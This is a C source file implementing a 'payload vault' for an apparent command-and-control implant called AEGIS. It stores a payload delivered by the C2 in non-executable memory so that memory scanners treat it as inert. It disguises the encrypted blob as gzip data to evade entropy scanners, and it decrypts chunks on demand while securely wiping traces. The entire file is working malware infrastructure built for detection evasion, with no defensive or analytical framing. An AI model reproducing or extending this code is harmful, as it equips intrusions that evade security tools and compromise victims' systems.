/*
 * ============================================================================
 *  AEGIS FRAMEWORK — Payload Vault (Implementation)
 * ============================================================================
 *  Classification : PRIVATE — LO/ENI EYES ONLY
 *  Component      : nanomachine/vault.c
 * ============================================================================
 */

#include "vault.h"
#include "../c2_comms/c2_client.h"
#include "../common/config.h"
#include "../common/logging.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>

/* ── Chunk Header (prepended to each chunk in the vault) ─────────────────── */

typedef struct {
  uint32_t chunk_id;
  uint32_t data_len; /* Actual data length (may be < chunk) */
  uint8_t iv[AEGIS_GCM_IV_BYTES];
  uint8_t tag[AEGIS_GCM_TAG_BYTES];
} AEGIS_PACKED vault_chunk_header_t;

#define CHUNK_HEADER_SIZE sizeof(vault_chunk_header_t)

/* ── Initialization ──────────────────────────────────────────────────────── */

aegis_result_t aegis_vault_init(aegis_vault_ctx_t *ctx,
                                const uint8_t *encrypted_data, size_t data_len,
                                size_t chunk_size, aegis_crypto_ctx_t *crypto,
                                aegis_log_ctx_t *log) {
  if (!ctx || !encrypted_data || data_len == 0 || !crypto)
    return AEGIS_ERR_VAULT;

  memset(ctx, 0, sizeof(*ctx));

  ctx->crypto = crypto;
  ctx->log = log;
  ctx->chunk_size = (chunk_size > 0) ? chunk_size : AEGIS_NANO_MAX_CHUNK_SIZE;

  /*
   * Apply entropy camouflage: wrap the encrypted data in a fake
   * gzip envelope so it looks like compressed data to entropy scanners.
   */
  size_t wrapped_len = 0;
  uint8_t *wrapped = malloc(data_len + 18); /* gzip overhead */
  if (!wrapped)
    return AEGIS_ERR_ALLOC;

  aegis_result_t rc = aegis_entropy_camouflage_wrap(encrypted_data, data_len,
                                                    wrapped, &wrapped_len);
  if (rc != AEGIS_OK) {
    free(wrapped);
    /* Fall back to storing raw encrypted data */
    wrapped_len = data_len;
    wrapped = malloc(data_len);
    if (!wrapped)
      return AEGIS_ERR_ALLOC;
    memcpy(wrapped, encrypted_data, data_len);
    ctx->camouflaged = false;
  } else {
    ctx->camouflaged = true;
  }

  /*
   * Allocate the vault as a non-executable memory region.
   * To any memory scanner, this is just inert data.
   * We explicitly deny PROT_EXEC.
   */
  size_t alloc_size = AEGIS_PAGE_ALIGN(wrapped_len);
  ctx->data = mmap(NULL, alloc_size,
                   PROT_READ | PROT_WRITE, /* Explicitly no PROT_EXEC */
                   MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

  if (ctx->data == MAP_FAILED) {
    free(wrapped);
    ctx->data = NULL;
    return AEGIS_ERR_MMAP;
  }

  memcpy(ctx->data, wrapped, wrapped_len);
  ctx->data_len = wrapped_len;
  free(wrapped);

  /* Calculate chunk count */
  /* Each "logical chunk" in the vault is: chunk_header + encrypted_data */
  /* For raw encrypted blobs, we treat the entire thing as a single
     addressable region and chunk it based on chunk_size.
     We must skip the C2 envelope when calculating the usable data size. */
  size_t pt_len = data_len;
  if (data_len > sizeof(aegis_c2_envelope_t)) {
    pt_len = ((const aegis_c2_envelope_t *)encrypted_data)->payload_len;
  }
  ctx->total_chunks =
      (uint32_t)((pt_len + ctx->chunk_size - 1) / ctx->chunk_size);

  aegis_log_memory_map(ctx->log, "mmap", ctx->data, alloc_size, -1,
                       PROT_READ | PROT_WRITE,
                       "Payload Vault (non-executable)");

  aegis_log_event(ctx->log, LOG_CAT_VAULT, LOG_SEV_INFO,
                  "Vault initialized: %zu bytes, %u chunks "
                  "(chunk_size=%zu, camouflaged=%s)",
                  ctx->data_len, ctx->total_chunks, ctx->chunk_size,
                  ctx->camouflaged ? "yes" : "no");

  ctx->initialized = true;
  return AEGIS_OK;
}

/* ── Teardown ────────────────────────────────────────────────────────────── */

void aegis_vault_destroy(aegis_vault_ctx_t *ctx) {
  if (!ctx || !ctx->initialized)
    return;

  if (ctx->data) {
    /* Multi-pass secure wipe */
    size_t alloc_size = AEGIS_PAGE_ALIGN(ctx->data_len);

    AEGIS_WIPE(ctx->data, ctx->data_len, AEGIS_NANO_WIPE_PASSES);

    aegis_log_memory_map(ctx->log, "munmap", ctx->data, alloc_size,
                         PROT_READ | PROT_WRITE, -1, "Payload Vault destroyed");

    munmap(ctx->data, alloc_size);
    ctx->data = NULL;
  }

  ctx->data_len = 0;
  ctx->total_chunks = 0;
  ctx->initialized = false;

  aegis_log_event(ctx->log, LOG_CAT_VAULT, LOG_SEV_INFO,
                  "Vault destroyed and wiped");
}

/* ── Chunk Access ────────────────────────────────────────────────────────── */

aegis_result_t aegis_vault_get_chunk(aegis_vault_ctx_t *ctx, uint32_t chunk_id,
                                     uint8_t *output, size_t *output_len) {
  if (!ctx || !ctx->initialized || !output || !output_len)
    return AEGIS_ERR_VAULT;

  if (chunk_id >= ctx->total_chunks)
    return AEGIS_ERR_VAULT;

  *output_len = 0;

  /*
   * Locate the chunk within the vault.
   * If camouflaged, we first need to strip the gzip wrapper to get
   * the raw encrypted data, then locate the chunk.
   */
  const uint8_t *raw_encrypted;
  size_t raw_len;
  uint8_t *unwrapped = NULL;

  if (ctx->camouflaged) {
    unwrapped = malloc(ctx->data_len);
    if (!unwrapped)
      return AEGIS_ERR_ALLOC;

    aegis_result_t rc = aegis_entropy_camouflage_unwrap(
        ctx->data, ctx->data_len, unwrapped, &raw_len);
    if (rc != AEGIS_OK) {
      free(unwrapped);
      return rc;
    }
    raw_encrypted = unwrapped;
  } else {
    raw_encrypted = ctx->data;
    raw_len = ctx->data_len;
  }

  /* Calculate chunk boundaries */
  size_t offset = (size_t)chunk_id * ctx->chunk_size;
  if (offset >= raw_len) {
    if (unwrapped) {
      AEGIS_ZERO(unwrapped, ctx->data_len);
      free(unwrapped);
    }
    return AEGIS_ERR_VAULT;
  }

  size_t this_chunk_len = ctx->chunk_size;
  if (offset + this_chunk_len > raw_len)
    this_chunk_len = raw_len - offset;

  /*
   * For a fully integrated system, each chunk would have its own
   * IV and tag prepended.  In this implementation, we extract
   * the C2 envelope from the start of the payload data to get
   * the original encryption parameters.
   */
  const aegis_c2_envelope_t *env = (const aegis_c2_envelope_t *)raw_encrypted;

  /*
   * Decrypt the chunk using the parameters provided by the C2.
   * We use aegis_decrypt_no_advance to ensure internal vault
   * operations do NOT desynchronize the main C2 communication state.
   */
  size_t pt_len = env->payload_len;
  uint8_t *full_plaintext = malloc(pt_len + 16);
  if (!full_plaintext) {
    if (unwrapped) {
      AEGIS_ZERO(unwrapped, ctx->data_len);
      free(unwrapped);
    }
    return AEGIS_ERR_ALLOC;
  }

  aegis_c2_envelope_t aad_env;
  memcpy(&aad_env, env, sizeof(aegis_c2_envelope_t));
  memset(aad_env.iv, 0, AEGIS_GCM_IV_BYTES);
  memset(aad_env.tag, 0, AEGIS_GCM_TAG_BYTES);

  aegis_result_t rc = aegis_decrypt_no_advance(
      ctx->crypto, raw_encrypted + sizeof(aegis_c2_envelope_t), pt_len,
      (const uint8_t *)&aad_env, sizeof(aegis_c2_envelope_t), env->iv, env->tag,
      full_plaintext);

  if (rc != AEGIS_OK) {
    AEGIS_ZERO(full_plaintext, pt_len + 16);
    free(full_plaintext);
    if (unwrapped) {
      AEGIS_ZERO(unwrapped, ctx->data_len);
      free(unwrapped);
    }
    return rc;
  }

  /* Extract the requested chunk from the decrypted payload */
  if (offset >= pt_len) {
    AEGIS_ZERO(full_plaintext, pt_len + 16);
    free(full_plaintext);
    if (unwrapped) {
      AEGIS_ZERO(unwrapped, ctx->data_len);
      free(unwrapped);
    }
    return AEGIS_ERR_VAULT;
  }

  if (offset + this_chunk_len > pt_len)
    this_chunk_len = pt_len - offset;

  memcpy(output, full_plaintext + offset, this_chunk_len);
  *output_len = this_chunk_len;

  AEGIS_WIPE(full_plaintext, pt_len + 16, 1);
  free(full_plaintext);

  aegis_log_crypto(ctx->log, "decrypt", this_chunk_len, env->iv,
                   "Vault chunk decrypted");

  aegis_log_event(ctx->log, LOG_CAT_VAULT, LOG_SEV_TRACE,
                  "Chunk %u/%u retrieved: offset=%zu len=%zu", chunk_id,
                  ctx->total_chunks, offset, this_chunk_len);

  /* Clean up the unwrapped buffer */
  if (unwrapped) {
    AEGIS_ZERO(unwrapped, ctx->data_len);
    free(unwrapped);
  }

  return AEGIS_OK;
}

uint32_t aegis_vault_chunk_count(const aegis_vault_ctx_t *ctx) {
  return ctx ? ctx->total_chunks : 0;
}

size_t aegis_vault_total_size(const aegis_vault_ctx_t *ctx) {
  return ctx ? ctx->data_len : 0;
}
